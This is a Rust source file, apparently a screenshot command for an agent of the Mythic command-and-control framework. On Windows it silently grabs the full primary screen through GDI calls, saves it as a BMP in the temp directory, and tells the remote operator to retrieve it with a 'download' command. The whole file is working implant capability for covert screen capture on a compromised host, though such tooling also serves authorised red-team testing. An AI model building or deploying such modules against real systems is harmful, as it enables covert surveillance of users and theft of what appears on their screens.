use crate::{AgentTask, mythic_success};
use std::error::Error;
use std::result::Result;

#[cfg(target_os = "windows")]
use std::{fs, ptr};
#[cfg(target_os = "windows")]
use winapi::shared::windef::{HBITMAP, HDC, HWND};
#[cfg(target_os = "windows")]
use winapi::um::wingdi::*;
#[cfg(target_os = "windows")]
use winapi::um::winuser::*;
#[cfg(target_os = "windows")]
use winapi::um::errhandlingapi::GetLastError;

/// Take a screenshot of the primary screen using WinAPI GDI functions
#[cfg(target_os = "windows")]
pub fn take_screenshot(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    unsafe {
        let hwnd_desktop: HWND = GetDesktopWindow();
        let hdc_screen: HDC = GetDC(hwnd_desktop);
        if hdc_screen.is_null() {
            return Err(format!("Failed to get screen DC. Error: {}", GetLastError()).into());
        }

        let hdc_mem: HDC = CreateCompatibleDC(hdc_screen);
        if hdc_mem.is_null() {
            ReleaseDC(hwnd_desktop, hdc_screen);
            return Err(format!("Failed to create memory DC. Error: {}", GetLastError()).into());
        }

        // Get screen size
        let width = GetSystemMetrics(SM_CXSCREEN);
        let height = GetSystemMetrics(SM_CYSCREEN);

        let hbitmap: HBITMAP = CreateCompatibleBitmap(hdc_screen, width, height);
        if hbitmap.is_null() {
            DeleteDC(hdc_mem);
            ReleaseDC(hwnd_desktop, hdc_screen);
            return Err(format!("Failed to create compatible bitmap. Error: {}", GetLastError()).into());
        }

        SelectObject(hdc_mem, hbitmap as *mut _);
        if BitBlt(hdc_mem, 0, 0, width, height, hdc_screen, 0, 0, SRCCOPY) == 0 {
            DeleteObject(hbitmap as *mut _);
            DeleteDC(hdc_mem);
            ReleaseDC(hwnd_desktop, hdc_screen);
            return Err(format!("BitBlt failed. Error: {}", GetLastError()).into());
        }

        // Save screenshot to a file with timestamp
        let timestamp = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_secs();
        let filename = format!("screenshot_{}.bmp", timestamp);
        let screenshot_path = std::env::temp_dir().join(&filename);
        
        save_bitmap_to_file(hbitmap, width as u32, height as u32, &screenshot_path)?;

        // Cleanup
        DeleteObject(hbitmap as *mut _);
        DeleteDC(hdc_mem);
        ReleaseDC(hwnd_desktop, hdc_screen);

        // Read BMP bytes for size info
        let screenshot_data = fs::read(&screenshot_path)?;

        Ok(mythic_success!(
            task.id,
            format!(
                "Screenshot saved to: {}\nFile size: {} bytes\nYou can download it using: download {}",
                screenshot_path.to_string_lossy(),
                screenshot_data.len(),
                screenshot_path.to_string_lossy()
            )
        ))
    }
}

/// Helper function: Save an HBITMAP to a .bmp file
#[cfg(target_os = "windows")]
unsafe fn save_bitmap_to_file(hbitmap: HBITMAP, width: u32, height: u32, path: &std::path::Path) -> Result<(), Box<dyn Error>> {
    use std::fs::File;
    use std::io::Write;

    let mut bmp_file_header = BITMAPFILEHEADER {
        bfType: 0x4D42, // 'BM'
        bfSize: 0,
        bfReserved1: 0,
        bfReserved2: 0,
        bfOffBits: std::mem::size_of::<BITMAPFILEHEADER>() as u32
            + std::mem::size_of::<BITMAPINFOHEADER>() as u32,
    };

    let mut bmp_info_header = BITMAPINFOHEADER {
        biSize: std::mem::size_of::<BITMAPINFOHEADER>() as u32,
        biWidth: width as i32,
        biHeight: height as i32,
        biPlanes: 1,
        biBitCount: 24,
        biCompression: BI_RGB,
        biSizeImage: 0,
        biXPelsPerMeter: 0,
        biYPelsPerMeter: 0,
        biClrUsed: 0,
        biClrImportant: 0,
    };

    let row_size = ((bmp_info_header.biBitCount as u32 * width + 31) / 32) * 4;
    let image_size = row_size * height;
    bmp_info_header.biSizeImage = image_size;

    bmp_file_header.bfSize = bmp_file_header.bfOffBits + image_size;

    let mut buffer = vec![0u8; image_size as usize];
    let hdc = GetDC(ptr::null_mut());
    GetDIBits(
        hdc,
        hbitmap,
        0,
        height as u32,
        buffer.as_mut_ptr() as *mut _,
        &mut BITMAPINFO {
            bmiHeader: bmp_info_header,
            bmiColors: [RGBQUAD {
                rgbBlue: 0,
                rgbGreen: 0,
                rgbRed: 0,
                rgbReserved: 0,
            }],
        },
        DIB_RGB_COLORS,
    );
    ReleaseDC(ptr::null_mut(), hdc);

    // Write BMP to file manually without bytemuck
    let mut file = File::create(path)?;
    
    // Write BITMAPFILEHEADER
    file.write_all(&bmp_file_header.bfType.to_le_bytes())?;
    file.write_all(&bmp_file_header.bfSize.to_le_bytes())?;
    file.write_all(&bmp_file_header.bfReserved1.to_le_bytes())?;
    file.write_all(&bmp_file_header.bfReserved2.to_le_bytes())?;
    file.write_all(&bmp_file_header.bfOffBits.to_le_bytes())?;
    
    // Write BITMAPINFOHEADER
    file.write_all(&bmp_info_header.biSize.to_le_bytes())?;
    file.write_all(&bmp_info_header.biWidth.to_le_bytes())?;
    file.write_all(&bmp_info_header.biHeight.to_le_bytes())?;
    file.write_all(&bmp_info_header.biPlanes.to_le_bytes())?;
    file.write_all(&bmp_info_header.biBitCount.to_le_bytes())?;
    file.write_all(&bmp_info_header.biCompression.to_le_bytes())?;
    file.write_all(&bmp_info_header.biSizeImage.to_le_bytes())?;
    file.write_all(&bmp_info_header.biXPelsPerMeter.to_le_bytes())?;
    file.write_all(&bmp_info_header.biYPelsPerMeter.to_le_bytes())?;
    file.write_all(&bmp_info_header.biClrUsed.to_le_bytes())?;
    file.write_all(&bmp_info_header.biClrImportant.to_le_bytes())?;
    
    // Write pixel data
    file.write_all(&buffer)?;
    Ok(())
}

#[cfg(not(target_os = "windows"))]
pub fn take_screenshot(_task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    Err("Screenshot functionality is only supported on Windows".into())
}
